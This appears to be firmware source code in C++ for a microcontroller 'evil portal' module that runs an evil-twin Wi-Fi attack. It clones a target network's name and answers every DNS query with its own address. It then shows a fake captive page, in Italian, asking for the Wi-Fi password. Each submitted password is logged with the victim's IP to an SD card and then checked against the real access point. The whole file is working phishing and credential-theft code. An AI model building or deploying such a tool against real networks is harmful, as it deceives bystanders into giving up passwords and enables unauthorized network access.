#include "evil_portal.h"
#include "evil_twin_verify.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

// Local wall-clock from the RTC (defined in main.cpp) — same helper the other
// SD loggers use, avoids poking the RTC driver directly.
void clock_screen_get_local_time(struct tm *out);

#define EP_MAX_CREDS 16   // in-RAM ring shown on the live list (SD keeps them all)

static WebServer  *s_web = nullptr;
static DNSServer  *s_dns = nullptr;
static bool        s_running   = false;
static int         s_creds     = 0;
static char        s_ssid[33]  = {0};
static char        s_last[48]  = {0};
static EvilCred    s_ring[EP_MAX_CREDS];
static int         s_ring_head = 0;   // index of the next write slot
static uint8_t     s_target_bssid[6] = {0};   // for password verification
static uint8_t     s_channel = 0;             // ditto
static bool        s_verify_enabled = false;

static const byte DNS_PORT = 53;

// ─── captive portal page ─────────────────────────────────────────────────────
// A generic "your network needs you to re-confirm the WiFi password" page. If
// the SD holds /EvilTwin/portal.html it's served verbatim instead (with %SSID%
// substituted), so a custom template can be dropped in without a reflash.
static String portal_page()
{
    // Custom template from SD wins.
    if (SD.exists("/EvilTwin/portal.html")) {
        File f = SD.open("/EvilTwin/portal.html", FILE_READ);
        if (f) {
            String html = f.readString();
            f.close();
            html.replace("%SSID%", s_ssid);
            return html;
        }
    }

    String s;
    s.reserve(1400);
    s += "<!doctype html><html><head><meta charset=utf-8>";
    s += "<meta name=viewport content='width=device-width,initial-scale=1'>";
    s += "<title>";  s += s_ssid;  s += "</title><style>";
    s += "body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f2f2f5;";
    s += "margin:0;color:#111}.c{max-width:380px;margin:8vh auto;background:#fff;";
    s += "border-radius:16px;padding:28px 24px;box-shadow:0 8px 30px rgba(0,0,0,.12)}";
    s += "h1{font-size:20px;margin:0 0 4px}.s{color:#666;font-size:14px;margin:0 0 20px}";
    s += "label{font-size:13px;color:#444}input{width:100%;box-sizing:border-box;";
    s += "padding:12px;margin:6px 0 16px;border:1px solid #ccc;border-radius:10px;font-size:16px}";
    s += "button{width:100%;padding:13px;border:0;border-radius:10px;background:#0a84ff;";
    s += "color:#fff;font-size:16px;font-weight:600}.w{font-size:12px;color:#999;margin-top:16px;text-align:center}";
    s += "</style></head><body><div class=c>";
    s += "<h1>Connessione a &ldquo;";  s += s_ssid;  s += "&rdquo;</h1>";
    s += "<p class=s>Per continuare, conferma la password della rete Wi-Fi.</p>";
    s += "<form method=POST action=/login>";
    s += "<label>Password della rete</label>";
    s += "<input type=password name=password autofocus required placeholder='Password Wi-Fi'>";
    s += "<button type=submit>Connetti</button></form>";
    s += "<p class=w>Autenticazione di rete</p></div></body></html>";
    return s;
}

static void log_cred(const String &pass)
{
    IPAddress ip = s_web->client().remoteIP();

    struct tm tm;
    clock_screen_get_local_time(&tm);
    char ts[24], clock[9];
    strftime(ts,    sizeof(ts),    "%Y-%m-%d %H:%M:%S", &tm);
    strftime(clock, sizeof(clock), "%H:%M:%S",          &tm);

    // Persist every capture to SD (full history), independent of the RAM ring.
    if (!SD.exists("/EvilTwin")) SD.mkdir("/EvilTwin");
    File f = SD.open("/EvilTwin/creds.txt", FILE_APPEND);
    if (f) {
        f.printf("%s\tssid=%s\tip=%s\tpassword=%s\n",
                 ts, s_ssid, ip.toString().c_str(), pass.c_str());
        f.close();
    }

    // Push into the live ring buffer for the on-screen list. s_creds doubles
    // as a monotonic capture id — we bump it before assigning so the first
    // capture is cred_id=1, and evil_verify_status() can look it up by id.
    s_creds++;
    EvilCred *c = &s_ring[s_ring_head];
    c->cred_id = s_creds;
    strncpy(c->time, clock, sizeof(c->time) - 1);   c->time[sizeof(c->time) - 1] = '\0';
    strncpy(c->ip, ip.toString().c_str(), sizeof(c->ip) - 1); c->ip[sizeof(c->ip) - 1] = '\0';
    strncpy(c->secret, pass.c_str(), sizeof(c->secret) - 1);  c->secret[sizeof(c->secret) - 1] = '\0';
    s_ring_head = (s_ring_head + 1) % EP_MAX_CREDS;

    snprintf(s_last, sizeof(s_last), "%s", pass.c_str());

    // Kick off the verification round-trip if we know which BSSID to test
    // against. Empty passwords are skipped — no sense round-tripping the AP
    // for an empty submission (they always fail auth, would clutter results).
    if (s_verify_enabled && pass.length() > 0) {
        evil_verify_enqueue(c->cred_id, s_ssid, pass.c_str(),
                            s_target_bssid, s_channel);
    }
}

// ─── handlers ────────────────────────────────────────────────────────────────
static void handle_root()
{
    s_web->send(200, "text/html", portal_page());
}

static void handle_login()
{
    String pass = s_web->arg("password");
    if (pass.length()) log_cred(pass);
    // Send them on their way so the page looks "successful" and they leave.
    s_web->send(200, "text/html",
        "<!doctype html><meta charset=utf-8><meta http-equiv=refresh content='2'>"
        "<body style='font-family:sans-serif;text-align:center;margin-top:24vh;color:#333'>"
        "<h2>Connessione in corso&hellip;</h2><p>Attendere.</p></body>");
}

// Any other URL (incl. the OS captive-detection probes like /generate_204 and
// /hotspot-detect.html) gets the portal, which pops the "sign in" sheet.
static void handle_not_found()
{
    s_web->send(200, "text/html", portal_page());
}

// ─── lifecycle ───────────────────────────────────────────────────────────────
bool evil_portal_start(const char *ssid, const uint8_t bssid[6], uint8_t channel)
{
    if (s_running) evil_portal_stop();

    strncpy(s_ssid, ssid && ssid[0] ? ssid : "Free WiFi", sizeof(s_ssid) - 1);
    s_ssid[sizeof(s_ssid) - 1] = '\0';
    s_creds  = 0;
    s_last[0] = '\0';
    s_ring_head = 0;
    memset(s_ring, 0, sizeof(s_ring));

    // Remember target BSSID + channel so log_cred() can enqueue a verify
    // round-trip against the real AP. bssid=NULL / all-zero disables it.
    s_channel = channel ? channel : 1;
    s_verify_enabled = false;
    if (bssid) {
        memcpy(s_target_bssid, bssid, 6);
        for (int i = 0; i < 6; i++) if (bssid[i]) { s_verify_enabled = true; break; }
    } else {
        memset(s_target_bssid, 0, 6);
    }
    evil_verify_reset();

    WiFi.mode(WIFI_AP);
    // Open network, same SSID, on the target's channel, hidden=false, 4 clients.
    if (!WiFi.softAP(s_ssid, nullptr, channel ? channel : 1, 0, 4)) {
        WiFi.mode(WIFI_STA);
        return false;
    }
    IPAddress apIP = WiFi.softAPIP();

    s_dns = new DNSServer();
    s_dns->setErrorReplyCode(DNSReplyCode::NoError);
    s_dns->start(DNS_PORT, "*", apIP);      // resolve every host to us

    s_web = new WebServer(80);
    s_web->on("/", handle_root);
    s_web->on("/login", HTTP_POST, handle_login);
    s_web->onNotFound(handle_not_found);
    s_web->begin();

    s_running = true;
    return true;
}

void evil_portal_stop()
{
    if (!s_running) return;
    if (s_web) { s_web->stop(); delete s_web; s_web = nullptr; }
    if (s_dns) { s_dns->stop(); delete s_dns; s_dns = nullptr; }
    // Reset the verify state machine so it doesn't try to poke the radio
    // after we've torn softAP down.
    evil_verify_reset();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    s_running = false;
    s_verify_enabled = false;
}

bool evil_portal_running() { return s_running; }

void evil_portal_tick()
{
    if (!s_running) return;
    if (s_dns) s_dns->processNextRequest();
    if (s_web) s_web->handleClient();
    // Drive the credential-verification state machine on the main task, so
    // its WiFi mode transitions don't collide with the WebServer handlers.
    if (s_verify_enabled) evil_verify_tick();
}

int         evil_portal_client_count() { return s_running ? WiFi.softAPgetStationNum() : 0; }
int         evil_portal_cred_count()   { return s_creds; }
const char *evil_portal_last_cred()    { return s_last; }
const char *evil_portal_ssid()         { return s_ssid; }

int evil_portal_get_creds(EvilCred *out, int max)
{
    int have = s_creds < EP_MAX_CREDS ? s_creds : EP_MAX_CREDS;
    int n = have < max ? have : max;
    // Walk backwards from the most recent write.
    for (int i = 0; i < n; i++) {
        int idx = (s_ring_head - 1 - i + EP_MAX_CREDS) % EP_MAX_CREDS;
        out[i] = s_ring[idx];
    }
    return n;
}
